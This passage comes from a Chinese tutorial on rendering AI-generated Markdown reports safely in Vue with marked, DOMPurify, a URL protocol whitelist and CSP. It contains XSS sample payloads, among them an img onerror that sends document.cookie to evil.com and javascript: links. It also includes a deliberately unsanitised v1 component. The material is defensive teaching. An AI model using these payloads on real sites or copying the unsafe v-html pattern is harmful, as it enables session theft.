+srv-042 在 14:28-14:30 CPU 持续超过 95% [1]，触发告警阈值 90% [2]。
+
+建议措施：
+- 检查该时间段进程列表 [3]
+- &lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;
+- [查看完整报告](javascript:alert(document.cookie))
+
+---
+
+前端安全渲染后用户看到：
+
+┌─────────────────────────────────────────┐
+│ ## 诊断结论                                │
+│                                            │
+│ srv-042 在 14:28-14:30 CPU 持续超过 95%    │
+│ [¹]，触发告警阈值 90% [²]。   ← [1][2]可点击 │
+│                                            │
+│ 建议措施：                                  │
+│ • 检查该时间段进程列表 [³]                  │
+│ • （恶意 &lt;img onerror&gt; 被净化，不渲染）      │
+│ • 查看完整报告（javascript: 链接被拦截，     │
+│   降级为纯文本，不可点击）                    │
+└─────────────────────────────────────────┘
+
+用户点击 [¹]：
+  → 页面滚动到审计面板，高亮 ToolCall t-01 (getMetrics)
+  → 展示原始返回：[{timestamp:"14:28",value:95.2},...]
+
+DevTools Console：
+  ✓ 恶意脚本执行数：0
+  ✓ CSP 拦截报告：blocked img onerror
+  ✓ 长报告（30KB）P95 渲染耗时：&lt; 50ms/chunk
+</code></pre>
+<p><strong>用户观察到的最终结果</strong>：</p>
+<ul>
+<li>Markdown 正常渲染（标题、列表、代码块有样式）</li>
+<li>恶意 <code>&lt;img onerror&gt;</code> / <code>&lt;script&gt;</code> 被静默移除，不执行、不显示</li>
+<li><code>javascript:</code> 链接降级为不可点击的纯文本</li>
+<li><code>[1] [2] [3]</code> 变成可点击的上标引用，点击定位到审计面板对应证据</li>
+<li>30KB 长报告流式渲染时不卡顿，CPU 平稳</li>
+</ul>
+<h3 id="12-这个模块在项目里承担什么">1.2 这个模块在项目里承担什么</h3>
+<ul>
+<li><strong>输入</strong>：Day 15 派生视图里 <code>run-view</code> 的 <code>finalReport</code>（模型生成的 Markdown 字符串）+ Day 15 审计面板里的 <code>rawEventsView</code>（用于解析 <code>[n]</code> 引用指向的 ToolCall / Anomaly）</li>
+<li><strong>输出</strong>：<code>ReportView.vue</code> 组件渲染出安全的、带可点击引用的诊断报告；一条可复用的净化管线 <code>sanitizeMarkdown(raw)</code>；一个引用解析器 <code>parseCitations(markdown, sources)</code></li>
+<li><strong>对齐后续</strong>：今天定义的 <strong>净化管线</strong>（<code>sanitize-pipeline.ts</code>）和 <strong>证据链模型</strong>（<code>Citation</code> / <code>CitationSource</code>）是 Day 17-20 LangChain RAG 回答展示（RAG 回答同样是不可信 Markdown + 引用来源文档）、Day 30 M3 端到端门禁（"任何展示给用户的模型输出都必须经过净化"）的安全地基。Day 30 会把"XSS 攻击语料测试通过率 100%"列为硬门禁</li>
+</ul>
+<h3 id="13-三版演进的目标">1.3 三版演进的目标</h3>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格"><table><thead>
+<tr>
+<th>版本</th>
+<th>实现的功能</th>
+<th>代码结构</th>
+<th>引入的知识</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>v1</strong></td>
+<td><code>marked</code> 解析 Markdown + <code>v-html</code> 渲染</td>
+<td>单组件 <code>ReportView.vue</code> 里直接 <code>v-html="marked(summary)"</code></td>
+<td>Markdown 解析基础、<code>v-html</code> 的危险性</td>
+</tr>
+<tr>
+<td><strong>v1 痛点</strong></td>
+<td>XSS 门户大开（<code>&lt;img onerror&gt;</code> 直接执行）；危险 URL 可点击；<code>[n]</code> 是死文本；长报告每 chunk 全量重解析</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>v2</strong></td>
+<td>v1 + <strong>DOMPurify 净化</strong> + <strong>URL 协议白名单</strong></td>
+<td>拆出 <code>sanitize/sanitize-pipeline.ts</code> + <code>sanitize/url-guard.ts</code></td>
+<td>HTML 白名单、DOMPurify 配置、URL 协议校验、净化管线的顺序</td>
+</tr>
+<tr>
+<td><strong>v2 痛点</strong></td>
+<td>证据链还没做（<code>[n]</code> 仍是纯文本）；长内容性能没优化（每 chunk 全量 <code>marked.parse</code>）</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>v3</strong></td>
+<td>v2 + <strong>证据链</strong>（<code>[n]</code> → 可点击引用 → 定位审计面板） + <strong>增量解析 + 节流</strong>（长报告 P95 &lt; 50ms）</td>
+<td>完整分层（sanitize/citation/render/perf）</td>
+<td>引用解析（正则 + source 映射）、引用血缘（lineage）、增量解析、<code>requestIdleCallback</code> / 节流、Vue 性能优化</td>
+</tr>
+</tbody>
+</table></div><p><strong>用户最终在项目里交付的是 v3</strong>。v1 和 v2 是教学用的过渡版本。</p>
+<hr>
+<h2 id="14-本日项目目录结构动手前先看骨架">1.4 本日项目目录结构（动手前先看骨架）</h2>
+<p><strong>为什么放在最前面</strong>：证据与 XSS 涉及前端 4 个关注点（Markdown 解析 / HTML 净化 + URL 校验 / 引用解析 + 证据链 / 长内容增量渲染），如果不先在脑子里立起骨架，写到一半就会把"解析 Markdown"和"净化 HTML"揉进同一个函数、把"URL 校验"漏在净化之外、把"引用解析"塞进 Vue 组件的 <code>computed</code>、把"节流"用一个散落的 <code>setTimeout</code> 糊上去。看完这棵树，下面章节再出现 <code>frontend/src/agent/report/sanitize/url-guard.ts</code> 时，你就能立刻定位它是"净化层"里专管 URL 协议的一个纯函数。</p>
+<p><strong>今天在 <code>p1-monitor/frontend/src/</code> 下要建立的完整目录树（v3 完整版）</strong>：</p>
+<pre><code>frontend/src/
+├── agent/
+│   ├── report/                                 ← 【新增】诊断报告安全渲染模块
+│   │   ├── sanitize/
+│   │   │   ├── sanitize-pipeline.ts            ← 净化管线（marked → DOMPurify）
+│   │   │   ├── sanitize-pipeline.spec.ts       ← 净化管线单元测试（含 XSS 语料）
+│   │   │   ├── url-guard.ts                    ← URL 协议白名单（纯函数）
+│   │   │   ├── url-guard.spec.ts               ← URL 校验单元测试
+│   │   │   └── xss-corpus.ts                   ← 12 类 XSS 攻击语料（测试固件）
+│   │   ├── citation/
+│   │   │   ├── citation.types.ts               ← Citation / CitationSource 类型
+│   │   │   ├── parse-citations.ts              ← 解析 [n] → 引用（纯函数）
+│   │   │   ├── parse-citations.spec.ts         ← 引用解析单元测试
+│   │   │   └── resolve-source.ts               ← [n] → ToolCall/Anomaly 映射（纯函数）
+│   │   ├── perf/
+│   │   │   ├── incremental-markdown.ts         ← 增量解析（只解析块级增量）
+│   │   │   └── incremental-markdown.spec.ts    ← 增量解析单元测试
+│   │   ├── ui/
+│   │   │   ├── ReportView.vue                  ← 报告渲染组件（用净化后的 HTML）
+│   │   │   └── CitationLink.vue                ← 单个可点击引用组件
+│   │   ├── useReport.ts                        ← 编排 composable（净化 + 引用 + 节流）
+│   │   └── index.ts                            ← 桶文件
+│   ├── reducer/derived/                         ← 【Day 15 已有】派生视图
+│   │   ├── run-view.ts                          ← 【Day 15 已有】提供 finalReport
+│   │   └── raw-events-view.ts                   ← 【Day 15 已有】提供引用 source
+│   └── ...
+├── features/agent-run/ui/AgentRunPanel.vue      ← 【Day 15 已有，v3 微调】挂 ReportView
+└── main.ts                                       ← 【已有】需要在 index.html 加 CSP meta
+</code></pre>
+<p><strong>三版演进对应的文件差异</strong>：</p>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格"><table><thead>
+<tr>
+<th>文件</th>
+<th>v1</th>
+<th>v2</th>
+<th>v3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ui/ReportView.vue</code></td>
+<td>✓ <code>v-html="marked(raw)"</code></td>
+<td>✓ <code>v-html="sanitize(raw)"</code></td>
+<td>✓ 渲染净化 HTML + 引用挂载点</td>
+</tr>
+<tr>
+<td><code>sanitize/sanitize-pipeline.ts</code></td>
+<td>✗</td>
+<td>✓ marked + DOMPurify</td>
+<td>✓ 同 v2</td>
+</tr>
+<tr>
+<td><code>sanitize/url-guard.ts</code></td>
+<td>✗</td>
+<td>✓ 协议白名单</td>
+<td>✓ 同 v2</td>
+</tr>
+<tr>
+<td><code>sanitize/xss-corpus.ts</code></td>
+<td>✗</td>
+<td>✓ 12 类语料</td>
+<td>✓ 同 v2</td>
+</tr>
+<tr>
+<td><code>citation/parse-citations.ts</code></td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ 正则解析 [n]</td>
+</tr>
+<tr>
+<td><code>citation/resolve-source.ts</code></td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ [n] → source 映射</td>
+</tr>
+<tr>
+<td><code>ui/CitationLink.vue</code></td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ 可点击引用组件</td>
+</tr>
+<tr>
+<td><code>perf/incremental-markdown.ts</code></td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ 增量解析 + 节流</td>
+</tr>
+<tr>
+<td><code>useReport.ts</code></td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ 编排层</td>
+</tr>
+<tr>
+<td><code>index.html</code> CSP meta</td>
+<td>✗</td>
+<td>✗</td>
+<td>✓ Content-Security-Policy</td>
+</tr>
+</tbody>
+</table></div><p><strong>依赖方向（务必单向，反过来一次都不行）</strong>：</p>
+<pre><code>features/agent-run/ui/AgentRunPanel.vue
+        │
+        ▼
+agent/report/ui/ReportView.vue
+        │
+        ▼
+agent/report/useReport.ts                    ← 编排：净化 → 解析引用 → 节流
+        │
+        ├─► agent/report/sanitize/sanitize-pipeline.ts   ← marked + DOMPurify
+        │           │
+        │           └─► agent/report/sanitize/url-guard.ts   ← URL 协议白名单（纯函数）
+        │
+        ├─► agent/report/citation/parse-citations.ts    ← 正则解析 [n]（纯函数）
+        │           │
+        │           └─► agent/report/citation/resolve-source.ts  ← [n]→source（纯函数）
+        │                       │
+        │                       └─► citation/citation.types.ts   ← 纯类型
+        │
+        └─► agent/report/perf/incremental-markdown.ts   ← 增量解析（纯函数）
+
+agent/report/ui/CitationLink.vue
+        │
+        └─► citation/citation.types.ts        ← 只依赖类型
+
+sanitize/*.ts    ← 只依赖 marked / dompurify，不 import Vue
+citation/*.ts    ← 纯函数，不 import Vue、不 import DOM
+perf/*.ts        ← 纯函数，不 import Vue
+</code></pre>
+<p><strong>红线</strong>：</p>
+<ul>
+<li><code>sanitize/url-guard.ts</code> 里出现 <code>import DOMPurify</code> 是塌方——URL 协议校验是独立的纯字符串判断，必须能脱离 DOM 单测</li>
+<li><code>citation/parse-citations.ts</code> 里出现 <code>import { ref } from 'vue'</code> 或 <code>document.querySelector</code> 是塌方——引用解析只做"字符串 → 结构化引用数组"的投影</li>
+<li><code>ui/ReportView.vue</code> 里直接 <code>v-html="marked(raw)"</code>（跳过 <code>sanitize-pipeline</code>）是塌方，也是本日最严重的安全事故——<strong>任何进入 <code>v-html</code> 的内容必须先过净化管线</strong></li>
+<li>在净化之后再拼接字符串（例如净化完再 <code>html.replace('[1]', '&lt;a href=...&gt;')</code> 手动插 HTML）是塌方——二次拼接会重新引入注入点；引用必须在净化管线内、用 DOMPurify 允许的标签表达</li>
+</ul>
+<p><strong>动手前先问自己 3 个问题</strong>：</p>
+<ol>
+<li><code>url-guard.ts</code> 为什么要独立于 DOMPurify？DOMPurify 不是已经能过滤危险属性了吗？—— 见 §5.4 知识点 2「URL 协议校验是 HTML 净化的补充而非替代」</li>
+<li>引用解析为什么放在净化<strong>之后</strong>做，而不是净化之前？—— 见 §5.4 知识点 4「净化与引用的顺序」</li>
+<li>长报告为什么不能每个 chunk 都 <code>marked.parse</code> 全量文本？O(N²) 具体差多少？—— 见 §5.4 知识点 6「增量解析与节流」</li>
+</ol>
+<hr>
+<h2 id="15-阶段-d动手脚手架20-分钟先搭骨架再看正文">1.5 阶段 D：动手脚手架（20 分钟，先搭骨架再看正文）</h2>
+<h3 id="151-d-1装依赖3-分钟">1.5.1 D-1：装依赖（3 分钟）</h3>
+<p>按第 5.3 节的代码：</p>
+<ul>
+<li><code>pnpm --filter frontend add marked dompurify</code></li>
+<li><code>pnpm --filter frontend add -D @types/dompurify</code></li>
+<li>确认版本：<code>marked</code> ≥ 12（旧版 API 不同）、<code>dompurify</code> ≥ 3</li>
+<li>注意：<code>marked</code> 从 v5 起解析是同步的，<code>marked.parse(str)</code> 直接返回 string</li>
+</ul>
+<p><strong>边写边问自己</strong>：</p>
+<ul>
+<li>为什么用 DOMPurify 而不是自己写正则过滤 <code>&lt;script&gt;</code>？（XSS 的绕过方式有几百种：<code>&lt;ScRiPt&gt;</code>、<code>&lt;img onerror&gt;</code>、<code>&lt;svg onload&gt;</code>、<code>&lt;iframe srcdoc&gt;</code>、HTML 实体编码……自己写正则永远漏；DOMPurify 是浏览器 DOM 解析 + 白名单，从原理上封死）</li>
+<li>为什么 marked 和 DOMPurify 要分两步而不是找一个"安全的 Markdown 库"？（关注点分离：marked 负责 md→html 语法转换，DOMPurify 负责 html→安全 html；各自可替换、各自可单测）</li>
+</ul>
+<h3 id="152-d-2创建目录2-分钟">1.5.2 D-2：创建目录（2 分钟）</h3>
+<p>按第 5.3 节的目录树，在 <code>frontend/src/agent/report/</code> 下建 4 个子目录：</p>
+<pre><code>report/
+├── sanitize/     ← 净化管线 + URL 校验 + XSS 语料
+├── citation/     ← 引用解析 + source 映射
+├── perf/         ← 增量解析
+└── ui/           ← ReportView + CitationLink
+</code></pre>
+<p><strong>边写边问自己</strong>：</p>
+<ul>
+<li>为什么 <code>sanitize/</code> 和 <code>citation/</code> 分开？（净化是"安全边界"，引用是"业务语义"；一个防攻击、一个做产品功能，混在一起就无法独立测 XSS 语料）</li>
+<li>为什么 <code>xss-corpus.ts</code>（攻击语料）放在 <code>sanitize/</code> 而不是 <code>__tests__/</code>？（语料是"净化管线的规格说明"——它定义了"必须挡住哪些攻击"，属于净化模块的一部分，未来 p2 复用净化管线时语料一起搬走）</li>
+</ul>
+<h3 id="153-d-3写-sanitize-层5-分钟">1.5.3 D-3：写 sanitize 层（5 分钟）</h3>
+<p>按第 5.3 节的代码：</p>
+<ul>
+<li>写 <code>sanitize/url-guard.ts</code>（<code>isSafeUrl(url): boolean</code>，纯函数）</li>
+<li>写 <code>sanitize/sanitize-pipeline.ts</code>（<code>sanitizeMarkdown(raw): string</code>）</li>
+<li>写 <code>sanitize/xss-corpus.ts</code>（12 类攻击语料数组）</li>
+</ul>
+<p><strong>边写边问自己</strong>：</p>
+<ul>
+<li><code>isSafeUrl</code> 为什么只白名单 <code>http/https/mailto</code>，而不是黑名单 <code>javascript/data</code>？（白名单是"默认拒绝"——新出现的危险协议（如 <code>vbscript:</code>、<code>file:</code>）自动被挡；黑名单永远追不上新攻击）</li>
+<li>DOMPurify 的 <code>ALLOWED_TAGS</code> 里为什么没有 <code>&lt;style&gt;</code> 和 <code>&lt;form&gt;</code>？（<code>&lt;style&gt;</code> 可以做 CSS 注入攻击、<code>&lt;form&gt;</code> 可以做钓鱼提交；诊断报告根本不需要它们）</li>
+<li>DOMPurify 的 hook（<code>afterSanitizeAttributes</code>）为什么还要再校验一次 <code>href</code>？（DOMPurify 默认允许 <code>&lt;a href&gt;</code>，但它对 <code>javascript:</code> 的拦截依赖配置；我们在 hook 里用自己的 <code>isSafeUrl</code> 做纵深防御，双保险）</li>
+</ul>
+<h3 id="154-d-4写-citation-层5-分钟">1.5.4 D-4：写 citation 层（5 分钟）</h3>
+<p>按第 5.3 节的代码：</p>
+<ul>
+<li>写 <code>citation/citation.types.ts</code>（<code>Citation</code> / <code>CitationSource</code> 类型）</li>
+<li>写 <code>citation/resolve-source.ts</code>（<code>resolveSource(index, sources): CitationSource | null</code>）</li>
+<li>写 <code>citation/parse-citations.ts</code>（<code>parseCitations(html, sources): { html, citations }</code>）</li>
+<li>写 <code>citation/parse-citations.spec.ts</code></li>
+</ul>
+<p><strong>边写边问自己</strong>：</p>
+<ul>
+<li>引用解析为什么接收的是 <code>html</code>（净化后）而不是 <code>markdown</code>（原始）？（净化后 <code>[1]</code> 仍是纯文本，此时替换成 <code>&lt;sup&gt;</code> 是安全的；如果在净化前替换，插入的 HTML 又要再净化一次，顺序反了）</li>
+<li><code>resolveSource</code> 为什么是纯函数、返回 <code>null</code> 而不是抛错？（<code>[99]</code> 引用了不存在的 source 是常见情况——模型幻觉；返回 null 让 UI 降级为不可点击的纯文本，而不是整个报告崩溃）</li>
+<li><code>Citation</code> 里为什么要存 <code>sourceVersion</code>？（证据血缘：如果 ToolCall 的结果后来被修正过，引用要能标注"此引用基于 v1 版本的数据"，避免结论和最新数据对不上还甩锅给模型）</li>
+</ul>
+<h3 id="155-d-5写-perf-usereport-ui5-分钟">1.5.5 D-5：写 perf + useReport + UI（5 分钟）</h3>
+<p>按第 5.3 节的代码：</p>
+<ul>
+<li>写 <code>perf/incremental-markdown.ts</code>（<code>createIncrementalParser()</code>）</li>
+<li>写 <code>report/useReport.ts</code>（编排：净化 → 引用 → 节流）</li>
+<li>写 <code>report/ui/CitationLink.vue</code></li>
+<li>写 <code>report/ui/ReportView.vue</code></li>
+<li>改 <code>features/agent-run/ui/AgentRunPanel.vue</code>（挂 <code>ReportView</code>）</li>
+<li>在 <code>index.html</code> 加 CSP <code>&lt;meta&gt;</code></li>
+</ul>
+<p><strong>边写边问自己</strong>：</p>
+<ul>
+<li>增量解析器为什么要按"块级边界"（<code>\n\n</code>）切分而不是按字符？（Markdown 的块（段落/列表/代码块）是解析单位；在块中间切会解析出错误的 HTML；只有遇到完整的块边界才能安全地增量解析）</li>
+<li><code>useReport</code> 为什么用 <code>requestAnimationFrame</code> 节流而不是 <code>setTimeout(fn, 16)</code>？（rAF 和浏览器渲染帧对齐，不会在同一帧内解析两次；<code>setTimeout</code> 可能在一帧内触发多次或错过帧）</li>
+<li>CSP <code>&lt;meta&gt;</code> 和净化管线是重复的吗？（不是——CSP 是"浏览器层"的最后防线（即使 JS 漏了，浏览器也不执行内联脚本），净化是"应用层"防线；纵深防御，两层都要）</li>
+</ul>
+<hr>
+<h2 id="2-学习节奏90-阅读-90-动手">2. 学习节奏（90 阅读 / 90 动手）</h2>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格"><table><thead>
+<tr>
+<th>阶段</th>
+<th>时长</th>
+<th>内容</th>
+<th>交付物</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A：读原理</td>
+<td>25 min</td>
+<td>§3-§5 三版演进 + §5.4 知识点 6 项</td>
+<td>心里能画出"裸渲染 → 净化 → 证据链 + 性能"的演进路径</td>
+</tr>
+<tr>
+<td>B：读代码</td>
+<td>30 min</td>
+<td>§5.3 逐文件通读，特别是 <code>sanitize-pipeline.ts</code> 和 <code>parse-citations.ts</code></td>
+<td>能口述"一段恶意 Markdown 经过管线的每一步变化"、"[n] 如何映射到 ToolCall"</td>
+</tr>
+<tr>
+<td>C：读深挖</td>
+<td>35 min</td>
+<td>§6.5 前端底子补弱（<code>Day16深挖-前端底子补弱.html</code>）</td>
+<td>能回答"DOMPurify 底层用什么解析 HTML"、"CSP 的各个指令含义"</td>
+</tr>
+<tr>
+<td>D：动手脚手架</td>
+<td>20 min</td>
+<td>§1.5 D-1 到 D-5</td>
+<td>骨架文件全部创建，<code>pnpm --filter frontend build</code> 通过</td>
+</tr>
+<tr>
+<td>E：写核心测试</td>
+<td>20 min</td>
+<td>§7.6 三个 spec 文件 + 12 类 XSS 语料</td>
+<td><code>pnpm --filter frontend test report</code> 全绿（含 XSS 语料执行数为 0）</td>
+</tr>
+<tr>
+<td>F-1：反证 1</td>
+<td>5 min</td>
+<td>§7.7 手动把 <code>v-html="sanitize(raw)"</code> 改回 <code>v-html="marked(raw)"</code>，喂 XSS 语料</td>
+<td>观察 <code>&lt;img onerror&gt;</code> 真的执行了，验证"没有净化是什么样子"</td>
+</tr>
+<tr>
+<td>F-2：反证 2</td>
+<td>5 min</td>
+<td>§7.8 手动去掉 <code>url-guard</code>，喂 <code>javascript:</code> 链接</td>
+<td>观察点击链接弹窗，验证"只靠 DOMPurify 默认配置不够"</td>
+</tr>
+<tr>
+<td>F-3：验证 + 提交</td>
+<td>10 min</td>
+<td>§7.9 四件套 + commit</td>
+<td>commit 含 <code>Refs: Day16</code></td>
+</tr>
+</tbody>
+</table></div><p><strong>总计</strong>：90 阅读（A+B+C）+ 90 动手（D+E+F）= 180 min</p>
+<hr>
+<h2 id="3-v1最小闭环marked-v-html-裸渲染">3. v1：最小闭环（marked + v-html 裸渲染）</h2>
+<h3 id="31-v1-要实现什么">3.1 v1 要实现什么</h3>
+<p>模型生成的 <code>Diagnosis.summary</code> 是 Markdown 字符串。v1 只做一件事：<strong>用 <code>marked</code> 把它解析成 HTML，用 <code>v-html</code> 渲染出来</strong>，让标题、列表、代码块有样式。</p>
+<p><strong>目标</strong>：</p>
+<ul>
+<li><code>ReportView.vue</code> 接收 <code>raw: string</code>（模型的 Markdown）</li>
+<li><code>marked.parse(raw)</code> 转成 HTML</li>
+<li><code>v-html</code> 渲染，页面显示带格式的报告</li>
+</ul>
+<p><strong>不做</strong>：</p>
+<ul>
+<li>不做任何净化（这就是 v1 的"痛点演示"）</li>
+<li>不解析 <code>[n]</code> 引用（纯文本显示）</li>
+<li>不做长内容性能优化</li>
+</ul>
+<h3 id="32-v1-目录结构">3.2 v1 目录结构</h3>
+<pre><code>frontend/src/agent/report/
+└── ui/ReportView.vue          ← 唯一文件：marked + v-html
+</code></pre>
+<h3 id="33-v1-完整代码">3.3 v1 完整代码</h3>
+<p><strong>frontend/src/agent/report/ui/ReportView.vue（v1 全文）</strong></p>
+<pre><code class="language-vue">&lt;script setup lang="ts"&gt;
+import { computed } from 'vue'
+import { marked } from 'marked'
+
+const props = defineProps&lt;{ raw: string }&gt;()
+
+// v1：直接把 Markdown 解析成 HTML
+// marked v5+ 的 parse 是同步的，返回 string
+const html = computed(() =&gt; marked.parse(props.raw) as string)
+&lt;/script&gt;
+
+&lt;template&gt;
+  &lt;!-- 危险！v-html 会执行 HTML 里的任何脚本 --&gt;
+  &lt;article class="report" v-html="html"&gt;&lt;/article&gt;
+&lt;/template&gt;
+
+&lt;style scoped&gt;
+.report {
+  line-height: 1.6;
+}
+.report :deep(h2) {
+  font-size: 1.2rem;
+  margin: 1rem 0 0.5rem;
+}
+.report :deep(ul) {
+  padding-left: 1.2rem;
+}
+.report :deep(code) {
+  background: #f5f5f5;
+  padding: 0.1rem 0.3rem;
+  border-radius: 3px;
+}
+&lt;/style&gt;
+</code></pre>
+<p><strong>frontend/src/features/agent-run/ui/AgentRunPanel.vue（v1 增量：挂载 ReportView）</strong></p>
+<pre><code class="language-vue">&lt;!-- 在 Day 15 的 AgentRunPanel.vue 里，把 result 卡片替换成 ReportView --&gt;
+&lt;script setup lang="ts"&gt;
+// ... Day 15 已有的 useAgentTimeline 编排 ...
+import ReportView from '@/agent/report/ui/ReportView.vue'
+
+// runView.finalReport 是模型生成的 Markdown 字符串（Day 15 派生视图提供）
+&lt;/script&gt;
+
+&lt;template&gt;
+  &lt;!-- ... Day 15 已有的时间线、Tool 卡片、审批面板 ... --&gt;
+
+  &lt;section v-if="runView.finalReport" aria-labelledby="report-title"&gt;
+    &lt;h3 id="report-title"&gt;诊断报告&lt;/h3&gt;
+    &lt;ReportView :raw="runView.finalReport" /&gt;
+  &lt;/section&gt;
+&lt;/template&gt;
+</code></pre>
+<h3 id="34-v1-暴露的痛点">3.4 v1 暴露的痛点</h3>
+<p><strong>痛点 1：<code>v-html</code> 直接执行恶意脚本（严重安全事故）</strong></p>
+<p>模型输出里如果有 <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code>，<code>marked</code> 会原样保留这个 <code>&lt;img&gt;</code> 标签（Markdown 允许内联 HTML），<code>v-html</code> 渲染时浏览器加载图片失败触发 <code>onerror</code>，脚本执行，用户 Cookie 被发到攻击者服务器。这是<strong>可以直接盗号的严重漏洞</strong>。</p>
+<p><strong>痛点 2：危险 URL 协议可点击</strong></p>
+<p>模型输出 <code>[查看详情](javascript:alert(document.cookie))</code>，marked 生成 <code>&lt;a href="javascript:alert(document.cookie)"&gt;查看详情&lt;/a&gt;</code>，<code>v-html</code> 渲染后这是一个活的链接，用户一点就执行脚本。</p>
+<p><strong>痛点 3：<code>[n]</code> 引用是死文本</strong></p>
+<p>模型说"CPU 超阈值 [1]"，<code>[1]</code> 只是普通字符，运维无法点击验证"这个结论基于哪条真实数据"。诊断报告失去可信度——模型说什么就是什么，没有证据支撑。</p>
+<p><strong>痛点 4：长报告每 chunk 全量重解析</strong></p>
+<p>诊断报告通过 SSE 流式推送，<code>raw</code> 每次 <code>text.delta</code> 都增长。v1 的 <code>computed(() =&gt; marked.parse(props.raw))</code> 在 <code>raw</code> 每次变化时都把<strong>累积的全部文本</strong>重新解析。30KB 报告分 200 个 chunk 推来，就要解析 200 次，每次解析的文本越来越长，总计算量 O(N²)，CPU 飙到 95%，页面卡顿掉帧。</p>
+<hr>
+<h2 id="4-v2加-dompurify-净化-url-协议白名单">4. v2：加 DOMPurify 净化 + URL 协议白名单</h2>
+<h3 id="41-v2-要实现什么">4.1 v2 要实现什么</h3>
+<p>用户视角：模型输出里的恶意脚本被剥离，报告只保留安全的格式（标题/列表/代码/安全链接），页面不再执行任何注入脚本。</p>
+<p><strong>目标</strong>：</p>
+<ul>
+<li>marked 解析后，用 DOMPurify 过滤危险标签和属性</li>
+<li>用 <code>isSafeUrl</code> 白名单校验所有 <code>&lt;a href&gt;</code> 和 <code>&lt;img src&gt;</code></li>
+<li>12 类 XSS 语料喂进来，执行数为 0</li>
+</ul>
+<p><strong>依然不做</strong>：</p>
+<ul>
+<li>不解析 <code>[n]</code> 引用（还是死文本）</li>
+<li>不做增量解析（长内容性能仍是 O(N²)）</li>
+</ul>
+<h3 id="42-v2-目录结构">4.2 v2 目录结构</h3>
+<pre><code>frontend/src/agent/report/
+├── sanitize/
+│   ├── url-guard.ts            ← 新增：URL 协议白名单（纯函数）
+│   ├── url-guard.spec.ts       ← 新增
+│   ├── sanitize-pipeline.ts    ← 新增：marked + DOMPurify 管线
+│   ├── sanitize-pipeline.spec.ts ← 新增
+│   └── xss-corpus.ts           ← 新增：12 类攻击语料
+└── ui/ReportView.vue           ← 改：调 sanitizeMarkdown
+</code></pre>
+<h3 id="43-v2-完整代码">4.3 v2 完整代码</h3>
+<p><strong>frontend/src/agent/report/sanitize/url-guard.ts（v2 全文）</strong></p>
+<pre><code class="language-typescript">/**
+ * URL 协议白名单校验。
+ * 只允许 http / https / mailto，其他一律拒绝。
+ * 白名单策略：新出现的危险协议（vbscript: / file: / blob: 等）自动被挡。
+ *
+ * 纯函数：不依赖 DOM、不依赖网络，100% 单测。
+ */
+const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:'])
+
+export function isSafeUrl(rawUrl: string): boolean {
+  const trimmed = rawUrl.trim()
+
+  // 相对路径（不含协议）视为安全：/api/x、./a、../b、#anchor
+  if (
+    trimmed.startsWith('/') ||
+    trimmed.startsWith('./') ||
+    trimmed.startsWith('../') ||
+    trimmed.startsWith('#')
+  ) {
+    return true
+  }
+
+  try {
+    // 用 URL 解析拿到协议；解析失败说明不是合法绝对 URL
+    const parsed = new URL(trimmed)
+    return SAFE_PROTOCOLS.has(parsed.protocol.toLowerCase())
+  } catch {
+    // 无法解析的（例如 "javascript:alert(1)" 在某些环境能解析出 javascript: 协议）
+    // 交给 SAFE_PROTOCOLS 判定；解析异常的一律拒绝
+    return false
+  }
+}
+</code></pre>
+<p><strong>frontend/src/agent/report/sanitize/url-guard.spec.ts（v2 全文）</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { isSafeUrl } from './url-guard'
+
+describe('isSafeUrl', () =&gt; {
+  it('允许 http/https/mailto', () =&gt; {
+    expect(isSafeUrl('https://example.com')).toBe(true)
+    expect(isSafeUrl('http://example.com/path?q=1')).toBe(true)
+    expect(isSafeUrl('mailto:ops@example.com')).toBe(true)
+  })
+
+  it('允许相对路径和锚点', () =&gt; {
+    expect(isSafeUrl('/agent/runs/r-01')).toBe(true)
+    expect(isSafeUrl('./detail')).toBe(true)
+    expect(isSafeUrl('#section-2')).toBe(true)
+  })
+
+  it('拒绝 javascript: 协议', () =&gt; {
+    expect(isSafeUrl('javascript:alert(document.cookie)')).toBe(false)
+    expect(isSafeUrl('JavaScript:alert(1)')).toBe(false)
+    expect(isSafeUrl('  javascript:alert(1)  ')).toBe(false)
+  })
+
+  it('拒绝 data: 和其他危险协议', () =&gt; {
+    expect(isSafeUrl('data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;')).toBe(false)
+    expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false)
+    expect(isSafeUrl('file:///etc/passwd')).toBe(false)
+  })
+})
+</code></pre>
+<p><strong>frontend/src/agent/report/sanitize/sanitize-pipeline.ts（v2 全文）</strong></p>
+<pre><code class="language-typescript">import { marked } from 'marked'
+import DOMPurify from 'dompurify'
+import { isSafeUrl } from './url-guard'
+
+// 报告允许的标签白名单：只保留展示格式，无 script/style/form/iframe
+const ALLOWED_TAGS = [
+  'h1', 'h2', 'h3', 'h4', 'p', 'br', 'hr',
+  'strong', 'em', 'del', 'blockquote',
+  'ul', 'ol', 'li',
+  'code', 'pre',
+  'a', 'img',
+  'table', 'thead', 'tbody', 'tr', 'th', 'td',
+  'sup', 'span',
+]
+
+const ALLOWED_ATTR = ['href', 'src', 'alt', 'title', 'class', 'data-citation']
+
+// 注册一次 hook：净化属性后，用自己的 isSafeUrl 再校验 href/src（纵深防御）
+let hookRegistered = false
+function ensureHook(): void {
+  if (hookRegistered) return
+  DOMPurify.addHook('afterSanitizeAttributes', (node) =&gt; {
+    const el = node as Element
+    for (const attr of ['href', 'src']) {
+      const value = el.getAttribute(attr)
+      if (value &amp;&amp; !isSafeUrl(value)) {
+        el.removeAttribute(attr)
+      }
+    }
